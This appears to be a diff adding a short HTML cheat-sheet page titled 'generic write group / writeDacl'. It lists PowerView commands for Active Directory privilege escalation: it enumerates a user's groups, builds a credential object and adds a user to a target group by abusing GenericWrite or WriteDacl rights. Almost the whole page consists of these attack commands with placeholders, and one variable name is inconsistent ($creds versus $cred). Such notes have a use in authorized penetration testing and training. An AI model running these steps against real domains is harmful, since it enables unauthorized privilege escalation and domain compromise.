@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>generic write group / writeDacl</title>
+</head><body><b>Get SamAccount of the group</b><br/>
+<br/>
+import powerview.ps1<br/>
+<br/>
+Get-DomainGroup -MemberIdentity &lt;username&gt; |select samaccountname<br/>
+<br/>
+<br/>
+<br/>
+$creds = New-Object System.Management.Automation.PSCredential('&lt;domain&gt;\&lt;username&gt;', $pass)<br/>
+<br/>
+<br/>
+<br/>
+Add-DomainGroupMember -Identity '&lt;target group&gt;' -Members &lt;username&gt; -Credential $cred<br/>
+<br/>
+<br/>
+Get-DomainGroup -MemberIdentity &lt;username&gt; |select samaccountname</body></html>
